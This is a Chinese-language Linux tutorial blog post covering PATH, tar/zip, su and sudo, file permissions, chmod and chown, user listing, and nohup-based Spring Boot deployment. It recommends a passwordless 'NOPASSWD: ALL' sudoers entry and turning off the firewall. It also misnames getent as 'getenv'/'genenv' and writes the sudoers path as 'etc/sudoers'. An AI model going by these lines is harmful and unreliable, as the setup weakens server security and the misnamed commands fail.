<p>可以将自定义路径加入PATH内，实现自定义命令在任意地方均可执行的效果</p>
<p>环境变量PATH会记录一组目录,目录之间用:隔开。这里记录的是命令的搜索路径<br>当执行命令会从记录中记录的目录中挨个搜索要执行的命令并执行。<br>可以通过修改这个项目的值，加入自定义的命令搜索路径<br>如export PATH&#x3D;$PATH:自定义路径\</p>
<h3 id="符号"><a href="#符号" class="headerlink" title="$符号"></a>$符号</h3><p>可以取出指定的环境变量的值</p>
<p>语法：$变量名</p>
<p>示例：</p>
<p>echo $PATH，输出PATH环境变量的值</p>
<p>echo ${PATH}ABC，输出PATH环境变量的值以及ABC</p>
<p>如果变量名和其它内容混淆在一起，可以使用${}</p>
<h3 id="压缩解压"><a href="#压缩解压" class="headerlink" title="压缩解压"></a>压缩解压</h3><h4 id="tar命令"><a href="#tar命令" class="headerlink" title="tar命令"></a>tar命令</h4><p>Linux和Mac系统常用有2种压缩格式，后缀名分别是:</p>
<ul>
<li>.tar，称之为tarball，归档文件，即简单的将文件组装到一个.tar的文件内，并没有太多文件体积的减少，仅仅是简单的封装</li>
<li>.gz，也常见为.tar.gz，gzip格式压缩文件,即使用gzip压缩算法将文件压缩到一个文件内,可以极大的减少压缩后的体积<br>针对这两种格式，使用tar命令均可以进行压缩和解压缩的操作</li>
</ul>
<p>语法: tar [-c -v -x -f -z -C] 参数1 参数2 … 参数N</p>
<ul>
<li>-c，创建压缩文件，用于压缩模式</li>
<li>-v，显示压缩、解压过程，用于查看进度</li>
<li>-x，解压模式</li>
<li>-f，要创建的文件，或要解压的文件，-f选项必须在所有选项中位置处于最后一个</li>
<li>-z，gzip模式，不使用-z就是普通的tarball格式</li>
<li>-C，选择解压的目的地，用于解压模式</li>
</ul>
<h4 id="压缩"><a href="#压缩" class="headerlink" title="压缩"></a>压缩</h4><p>tar -zcvf 压缩包 被压缩1…被压缩2…被压缩N</p>
<ul>
<li>-z表示使用gzip，可以不写，如果使用一般放到选项位的第一个</li>
<li>将被压缩1，2，3放到压缩包里<br>zip [-r] 参数1 参数2 参数N<br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/Linux/%E5%8E%8B%E7%BC%A9/zipOne.png"></li>
</ul>
<h4 id="解压"><a href="#解压" class="headerlink" title="解压"></a>解压</h4><p>tar -zxvf 被解压的文件 -C 要解压去的地方</p>
<ul>
<li>-z表示使用gzip，可以省略</li>
<li>-C，单独使用，和解压所需的其他参数分开，可以省略，指定要解压去的地方，不写解压到当前目录<br>unzip [-d] 参数<br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/Linux/%E5%8E%8B%E7%BC%A9/zipTwo.png"></li>
</ul>
<h3 id="su命令"><a href="#su命令" class="headerlink" title="su命令"></a>su命令</h3><p>切换用户</p>
<p>语法：su [-] [用户]</p>
<ul>
<li>-表示切换后加载环境变量，建议带上</li>
<li>用户可省略，省略默认切换到root</li>
</ul>
<h3 id="sudo命令"><a href="#sudo命令" class="headerlink" title="sudo命令"></a>sudo命令</h3><ul>
<li>可以让一条普通命令带有root权限，语法：sudo 其他命令</li>
<li>需要以root用户执行visudo命令，增加配置方可让普通用户有sudo命令的执行权限</li>
</ul>
<p>比如：visudo&#x2F;vi etc&#x2F;sudoers</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">lzj ALL=(ALL)       NOPASSWD: ALL</span><br><span class="line">在visudo内配置如上内容，可以让lzj用户，无需密码直接使用sudo</span><br></pre></td></tr></table></figure>

<h2 id="Linux权限"><a href="#Linux权限" class="headerlink" title="Linux权限"></a>Linux权限</h2><h3 id="权限细节"><a href="#权限细节" class="headerlink" title="权限细节"></a>权限细节</h3><p>通过ll可以以列表形式查看内容，并显示权限细节<br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/Linux/%E5%8E%8B%E7%BC%A9/permissionOne.png"></p>
<ul>
<li>序号1，表示文件、文件夹的权限控制信息</li>
<li>序号2，表示文件、文件夹所属用户</li>
<li>序号3，表示文件、文件夹所属用户组<br>权限细节总分为10个槽位<br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/Linux/%E5%8E%8B%E7%BC%A9/permissionTwo.png"></li>
</ul>
<p>rwx<br>r表示读权限<br>w表示写权限<br>x表示执行权限</p>
<p>针对文件、文件夹的不同，rwx的含义有细微差别</p>
<p>r：针对文件可以查看文件内容<br>针对文件夹，可以查看文件夹内容，如ls命令</p>
<p>w：针对文件表示可以修改此文件<br>针对文件夹，可以在文件夹内:创建、删除、改名等操作</p>
<p>x，针对文件表示可以将文件作为程序执行<br>针对文件夹，表示可以更改工作目录到此文件夹，即cd进入</p>
<h3 id="chmod命令"><a href="#chmod命令" class="headerlink" title="chmod命令"></a>chmod命令</h3><p>修改文件、文件夹权限</p>
<p>语法：chmod [-R] 权限 参数</p>
<ul>
<li>权限，要设置的权限，比如755，表示：rwxr-xr-x<br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/Linux/%E5%8E%8B%E7%BC%A9/chomdOne.png"></li>
<li>参数，被修改的文件、文件夹</li>
<li>选项-R，设置文件夹和其内部全部内容一样生效</li>
</ul>
<p>示例：</p>
<ul>
<li><p>chmod u&#x3D;rwx,g&#x3D;rx,o&#x3D;x hello.txt，将文件权限修改为:rwxr-x—x</p>
</li>
<li><p>其中:u表示user所属用户权限,g表示group组权限,o表示other其它用户权限</p>
</li>
<li><p>chmod -R u&#x3D;rwx,g&#x3D;rx,o&#x3D;x test,将文件夹test以及文件夹内全部内容权限设置为: rwxr-x—x<br>快捷写法：<br>权限可以用3位数字来代表，第一位数字表示用户权限，第二位表示用户组权限，第三位表示其它用户权限。</p>
</li>
<li><p>chmod 751 hello.txt,将文件权限修改为:rwxr-x—x</p>
</li>
</ul>
<h3 id="chown命令"><a href="#chown命令" class="headerlink" title="chown命令"></a>chown命令</h3><p>修改文件、文件夹所属用户、组</p>
<p>普通用户无法修改所属为其它用户或组,所以此命令只适用于root用户执行</p>
<p>语法：chown [-R] [用户][:][用户组] 文件或文件夹<br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/Linux/%E5%8E%8B%E7%BC%A9/chownOne.png"></p>
<h3 id="用户组管理"><a href="#用户组管理" class="headerlink" title="用户组管理"></a>用户组管理</h3><p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/Linux/%E5%8E%8B%E7%BC%A9/userGroupOne.png"></p>
<h3 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h3><p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/Linux/%E5%8E%8B%E7%BC%A9/userMange.png"></p>
<h3 id="genenv命令"><a href="#genenv命令" class="headerlink" title="genenv命令"></a>genenv命令</h3><p>getenv group，查看系统全部的用户组<br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/Linux/%E5%8E%8B%E7%BC%A9/genenvOne.png"><br>共有3份信息，分别是：</p>
<p>组名称:组认证(显示为x):组ID</p>
<p>getenv passwd，查看系统全部的用户<br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/Linux/%E5%8E%8B%E7%BC%A9/gennevTwo.png"></p>
<p>共有7份信息，分别是：</p>
<p>​ 用户名:密码(x):用户ID:组ID:描述信息(无用):HOME目录:执行终端(默认bash)</p>
<h3 id="env命令"><a href="#env命令" class="headerlink" title="env命令"></a>env命令</h3><p>查看系统全部的环境变量</p>
<p>语法：env</p>
<h2 id="linux项目部署"><a href="#linux项目部署" class="headerlink" title="linux项目部署"></a>linux项目部署</h2><h3 id="手动部署"><a href="#手动部署" class="headerlink" title="手动部署"></a>手动部署</h3><ul>
<li>在IDEA中开发springboot项目并打成jar包</li>
<li>将jar包上传到linux服务器</li>
<li>java -jar xxx.jar启动springboot程序</li>
<li>关闭防火墙<br>注意：改为后台运行SpringBoot程序，并将日志输出到日志文件</li>
</ul>
<p>目前程序运行的问题<br>线上程序不会采用控制台霸屏的形式运行程序，而是将程序在后台运行<br>线上程序不会将日志输出到控制台，而是输出到日志文件，方便运维查阅信息</p>
<p>nohup 命令: 英文全称 no hang up (不挂起) ，用于不挂断地运行指定命令，退出终端不会影响程序的运行</p>
<p>语法格式: nohup Command [Arg …] [&amp;]</p>
<p>参数说明:</p>
<ul>
<li>Command:要执行的命令</li>
<li>Arg:一些参数，可以指定输出文件</li>
<li>&amp;: 让命令在后台运行</li>
</ul>
<p>举例:</p>
<p>nohup java -jar boot工程.jar &amp;&gt; hello.log &amp;： 后台运行iava -jar命令，并将日志输出到hello.log文件、、</p>
<p>停止springboot进程</p>
<p>1.ps -ef | grep java -jar：找出进程</p>
<p>2.kill -9 35685：杀死进程</p>
<h3 id="通过shell脚本自动部署项目"><a href="#通过shell脚本自动部署项目" class="headerlink" title="通过shell脚本自动部署项目"></a>通过shell脚本自动部署项目</h3><p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/Linux/%E5%8E%8B%E7%BC%A9/deploymentOne.png"></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
</search>
